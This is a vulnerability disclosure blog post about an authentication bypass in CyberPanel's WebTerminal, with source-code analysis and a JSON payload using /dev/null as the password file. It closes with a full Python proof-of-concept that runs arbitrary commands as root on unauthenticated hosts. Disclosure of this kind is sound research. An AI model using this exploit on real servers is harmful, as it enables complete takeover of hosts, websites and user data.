---
title:  "[1] CyberPanel - WebTerminal Authentication Bypass"
layout: post
author: Altion
date:   2024-01-22
last_modified_at: 2024-01-27
permalink: /posts/cyberpanel-1
categories: cyberpanel, security research
---

In CyberPanel versions between 1.9.2 and 2.1.1, the WebTerminal functionality is susceptible to an authentication bypass vulnerability. Unauthenticated attackers could exploit this vulnerability to gain root shell access in the underlying CyberPanel host. Through the elevated access privileges, an attacker could achieve complete control over the data, user accounts, and websites in the compromised CyberPanel instance.

<table>
    <tr>
        <th>OWASP Top 10</th>
        <td><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" target="blank">A07:2021</a> - Identification and Authentication Failures</td>
    </tr>
    <tr>
        <th>CWE ID</th>
        <td><a href="https://cwe.mitre.org/data/definitions/287.html" target="blank">CWE-287</a> - Improper Authentication</td>
    </tr>
    <tr>
        <th>CVSS v4.0 Score</th>
        <td><a href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H" target="blank">Critical (9.5)</a></td>
    </tr>
    <tr>
        <th>Vendor URLs</th>
        <td>
            <a href="https://cyberpanel.net/" target="blank">https://cyberpanel.net/</a>
            <br />
            <a href="https://github.com/usmannasir/cyberpanel" target="blank">https://github.com/usmannasir/cyberpanel</a>
        </td>
    </tr>    
    <tr>
        <th>Affected Versions</th>
        <td>1.9.2 - 2.1.1, fixed in v2.3.5</td>
    </tr> 
</table>


Introduced[^1] in version 1.9.2, WebTerminal can be accessed only by administrative users. Essentially, WebTerminal can be used to gain shell access on the underlying host running CyberPanel. While users have found the functionality useful, it was quite interesting to see the vendor's decision to disable[^2] the feature in version 2.1.2.

At the time of writing, CyberPanel's latest version is 2.3.4 and the WebTerminal feature remains disabled. However, since the functionality is still present in code, it would not be very difficult for someone to enable it on their own. As a result, outdated versions of CyberPanel, and instances where WebTerminal is enabled could still be affected by this vulnerability, and should be examined for indications of compromise. 

To make it somewhat more interesting and easier for technical people to follow these posts, I have included code snippets wherever possible. Hopefully you have some fun. Here we go.

#### Technical Analysis

To facilitate the WebTerminal functionality, CyberPanel first establishes an SSH connection to localhost, and then exposes this connection through WebSockets on port `5678`. To protect the WebSockets connection, an authentication mechanism is implemented to ensure that only authenticated administrative users can access the WebTerminal.

WebTerminal can be accessed through the left-side menu, or by manually navigating to the `/Terminal` page. Looking at the source code, this endpoint is handled by the `terminal` view function, shown below on line 5:

```python
# File: WebTerminal/urls.py
1: from django.conf.urls import url
2: from . import views
3: 
4: urlpatterns = [
5:     url(r'^$', views.terminal, name='terminal'), # [1]
6:     url(r'^restart$', views.restart, name='restart'),
7: ]
```

Here, CyberPanel generates a random password (line 21). The password is then written to a random file in the `/home/cyberpanel/` directory (lines 23-26). Once these steps are completed, the function renders the generated credentials in the WebTerminal web page (lines 44-46).

```python
# File: WebTerminal/views.py
...
20: def terminal(request):
21:     password = plogical.randomPassword.generate_pass()
22: 
23:     verifyPath = "/home/cyberpanel/" + str(randint(100000, 999999))
24:     writeToFile = open(verifyPath, 'w')
25:     writeToFile.write(password)
26:     writeToFile.close()
... 
44:     proc = httpProc(request, 'WebTerminal/WebTerminal.html',
45:                     {'verifyPath': verifyPath, 'password': password}, 'admin')
46:     return proc.render()
...
```

When the WebTerminal page is fully loaded, CyberPanel extractes and uses the authentication credentials to establish the WebSockets connection on port `5678`. Specifics to this implementation are further explained below.

> Note on something that might not be entirely obvious in the above code snippet.<br /><br /> Aside from generating WebTerminal authentication credentials, the `terminal()` function implementation also starts the SSH service.<br /><br /> While the expectation was that access to the `/Terminal` page should have been authenticated, in reality it is completely unauthenticated. And this will play a significant role later in the analysis.

In code, authentication requests, including all of the incoming WebSockets traffic are handled by the `on_message()` function in the `WSHandler` class:

```python
# File: WebTerminal/CPWebSocket.py
...
101: class WSHandler(tornado.websocket.WebSocketHandler):
102: 
103:     def open(self):
104:         print('connected')
105:         self.running = 1
106:         self.sh = SSHServer(self)
107:         self.shell = self.sh.shell
108:         self.sh.start()
109:         self.init = 1
110:         print('connect ok')
111: 
112:     def on_message(self, message):
113:         try:
114:             print('handle message')
115:             data = json.loads(message)
116: 
117:             if self.init:
118:                 self.sh.verifyPath = str(data['data']['verifyPath'])
119:                 self.sh.password = str(data['data']['password'])
120:                 self.sh.filePassword = open(self.sh.verifyPath, 'r').read()
121:                 self.init = 0
122:             else:
123:                 if os.path.exists(self.sh.verifyPath):
124:                     if self.sh.filePassword == self.sh.password:
125:                         self.shell.send(str(data['data']))
126: 
127:         except BaseException as msg:
128:             print('%s. [WebTerminalServer.handleMessage]' % (str(msg)))
...
```

Starting from lines 117-121, the WebSocket connection is initialized with the authentication details passed in the JSON `password` and `verifyPath` fields.

If the file indicated by `verifyPath` contains an exact match of the password found in the `password` field, authentication is considered successful. WebTerminal then executes the shell command found within the JSON `data` field (line 125).

`WSHandler` will check these passwords when returning the standard output back to the user (lines 82-84). This check seems kind of redundant since the passwords are already stored in the class instance: 

```python
# File: WebTerminal/CPWebSocket.py
18: class SSHServer(multi.Thread):
...
77:     def recvData(self):
78:         asyncio.set_event_loop(asyncio.new_event_loop())
79:         while True:
80:             try:
81:                 if self.websocket.running:
82:                     if os.path.exists(self.verifyPath) and self.filePassword == self.password:
83:                         if self.shell.recv_ready():
84:                             self.websocket.write_message(self.shell.recv(9000).decode("utf-8"))
85:                         else:
86:                             time.sleep(0.001)
...
95:     def run(self):
96:         try:
97:             self.recvData()
98:         except BaseException as msg:
99:             print('%s. [SSHServer.run]' % (str(msg)))
...
```

Do you notice anything weird in this authentication mechanism? Well, using the JSON `verifyPath` field it is possible to circumvent authentication by providing paths to system files with known contents.

Specifically, the authentication mechanism relies on user-controlled input to determine the storage location of the file containing the generated password. For example, it is possible to send the following JSON data and bypass the WebTerminal authentication:

```json
{
    "tp": "init",
    "data": {
        "verifyPath": "/dev/null",
        "password": ""
    }
}
```

In this example, the Linux `/dev/null` device file returns no data which can be considered as an empty string. Since the contents of the `/dev/null` file match the given empty password string, all authentication checks will be marked as successful.

#### Proof-of-Concept Exploit Code

To demonstrate the low attack complexity, I wrote the following Python script which can be used to bypass the WebTerminal authentication mechanism and execute arbitrary shell commands as root:

```python
#!/usr/bin/env python3
import websocket
import json
import ssl
import argparse
import requests
from threading import Timer
from os import _exit
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

description = "CyberPanel v1.9.2-v2.1.1 - WebTerminal Authentication Bypass"

# parse command line arguments
parser = argparse.ArgumentParser(description = description)
parser.add_argument("--host", help="The remote CyberPanel host (e.g., 10.0.0.1)",  type=str, required=True)
parser.add_argument("-c", "--command", help="The shell command to execute (e.g., whoami)", type=str, required=True)
args = parser.parse_args()

CP_HOST = args.host
CMD = args.command

WSS_URL = "wss://"+ CP_HOST +":5678"

# misc
credentials = {
    "verifyPath": "/dev/null",
    "password": ""
}

init_data = {
    "tp": "init", 
    "data": credentials
}

client_data = {
    "tp":"client",
    "data": ""
}

def check_cpssh_status():
    # Make an unauthenticated HTTP GET request to retrieve an anti-CSRF token
    # The anti-CSRF token is required to access the web page and start the WebTerminal CPSSH service.
    cyberpanel_url = "https://"+ CP_HOST + ":8090" 
    headers = requests.get(cyberpanel_url, verify=False).headers
    csrf_token = headers.get("Set-Cookie").split(';')[0].split('=')[1]

    cookies = {"csrf_token": csrf_token}
    headers = {"X-Csrftoken": csrf_token}

    res = requests.get(cyberpanel_url + "/Terminal/", verify=False, cookies=cookies, headers=headers)
    status = res.status_code

    if status == 200:
        print("[!] Looks like the WebTerminal CPSSH service is already running.")
    elif status == 500:
        print("[*] The WebTerminal CPSSH service has been started.")

def send_command(ws, cmd):
    client_data['data'] = cmd + '\r'
    client_data.update(credentials)
    data = json.dumps(client_data)
    ws.send(data)

def on_message(ws, msg):
    print(msg)

def terminate_script():
    print("[+] Exiting!")
    _exit(0)

def on_open(ws):
    print("[+] Initializing WebTerminal.\n")
    ws.send(json.dumps(init_data))
    print("[+] Sending payload.\n")
    send_command(ws, CMD)
    Timer(10, terminate_script).start() # change timeout depending on your network latency with the cyberpanel instance

print("================================================================================")
print(description)
print("================================================================================\n")

check_cpssh_status()

ws = websocket.WebSocketApp(WSS_URL, on_message = on_message, on_open = on_open)
ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
```

#### Further Reading

The adventure continues in the next post: [Authentication Bypass and Local File Inclusion (LFI) in CloudAPI](/weblog{% post_url 2024-01-22-cyberpanel-2 %})

<h5 class="references">References</h5>

[^1]: <a href="https://community.cyberpanel.net/t/change-logs/161/3#v192-stable-3" target="_blank">https://community.cyberpanel.net/t/change-logs/161/3#v192-stable-3</a>
[^2]: <a href="https://github.com/usmannasir/cyberpanel/commit/4ef2004abd8c2f8ac4769cb15750b2c68dc17a18#diff-74610417a3aa9e97e99749c7f30f8966588e2d9ff32eb2b5d3a126c914bc76bc" target="_blank">https://github.com/usmannasir/cyberpanel/commit/4ef2004abd8c2f8ac4769cb15750b2c68dc17a18#diff-74610417a3aa9e97e99749c7f30f8966588e2d9ff32eb2b5d3a126c914bc76bc</a>